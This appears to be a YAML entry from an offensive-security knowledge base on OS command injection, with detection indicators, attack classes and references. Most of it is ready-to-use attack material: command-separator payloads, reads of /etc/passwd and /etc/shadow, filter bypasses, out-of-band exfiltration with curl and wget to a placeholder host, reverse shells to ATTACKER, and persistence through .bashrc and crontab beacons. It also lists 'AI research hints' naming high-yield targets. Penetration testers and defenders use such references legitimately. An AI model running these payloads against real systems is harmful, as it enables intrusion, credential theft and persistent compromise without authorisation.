id: CMDI
name: OS Command Injection — Comprehensive
cwe:
- CWE-78
- CWE-77
owasp: A03:2021 Injection
severity_range: Critical
description: User input passed to shell commands without sanitization enables OS command execution. Often in features that
  use system tools (ping, dig, traceroute, image conversion, archive extraction).
detection:
  indicators:
  - Features that invoke system commands (ping host, DNS lookup, file conversion)
  - Parameters named host, ip, file, url, command
  - Functionality wrapping CLI tools (ffmpeg, ImageMagick, tar, gzip)
  payloads:
    command_separators:
    - ; id
    - '| id'
    - '& id'
    - '&& id'
    - '|| id'
    - '`id`'
    - $(id)
    - \nid
    - '%0aid'
    linux_specific:
    - ; cat /etc/passwd
    - '| cat /etc/shadow'
    - ; uname -a
    - ; whoami
    - ; ls -la /
    - ; find / -name '*.config' 2>/dev/null
    windows_specific:
    - '& whoami'
    - '&& dir'
    - ; type C:\windows\win.ini
    - '& systeminfo'
    - '& net user'
    blind_via_oob:
    - ; curl http://oob/$(whoami)
    - ; nslookup `whoami`.oob.com
    - ; ping -c 1 `id|base64`.oob.com
    - ; wget --post-data "$(cat /etc/passwd)" http://oob/
    time_based_blind:
    - ; sleep 10
    - ; ping -c 10 127.0.0.1
    - '& timeout 10'
    - ; perl -e 'sleep(10)'
  attack_classes:
    visible_response:
      description: Command output appears in HTTP response
      severity: critical
    blind_time_based:
      description: No output but command runs — detect via sleep
      severity: critical
    blind_oob:
      description: Command exfils data via DNS/HTTP callback
      severity: critical
    second_order_cmdi:
      description: Payload stored, executed later by background job
      severity: high
filter_bypasses:
- 'Quoted injection: "; id; #'
- 'Variable expansion: $@id, ${IFS}id'
- 'Wildcard expansion: /???/??t /etc/passwd → /bin/cat /etc/passwd'
- 'Brace expansion: {ls,-la,/}'
- 'Base64 + bash decode: $(echo bHM= | base64 -d)'
- 'Reverse the string: $(echo ls | rev)'
- 'Backticks if pipe blocked: `id`'
- 'Tab/newline if space blocked: id${IFS}-a'
- 'Concatenation: ''l''+''s'''
- 'Hex escapes: \x69\x64'
exploitation:
  reverse_shell:
  - ; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
  - ; nc ATTACKER 4444 -e /bin/sh
  - ; python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")'
  data_exfiltration:
  - ; curl -X POST -d "$(cat /etc/passwd | base64)" http://oob/
  - ; tar czf - /etc | base64 | curl -X POST --data-binary @- http://oob/
  persistence:
  - ; echo 'curl http://oob/x.sh|bash' >> ~/.bashrc
  - ; (crontab -l; echo '* * * * * curl http://oob/beacon') | crontab -
ai_research_hints:
- Image processing features (ImageMagick, GraphicsMagick) often have RCE via crafted images
- Archive extraction features (tar, zip) sometimes shell out for processing
- PDF generators (wkhtmltopdf) execute external processes
- DNS lookup / network diagnostic features almost always vulnerable
- Admin panels with 'run script' or 'execute report' features are easy CMDi
- Backup/restore features that wrap tar/zip are high-yield
tools:
- Commix (automated)
- OOB callback server
- Burp Intruder
references:
- https://owasp.org/www-community/attacks/Command_Injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- https://book.hacktricks.xyz/pentesting-web/command-injection
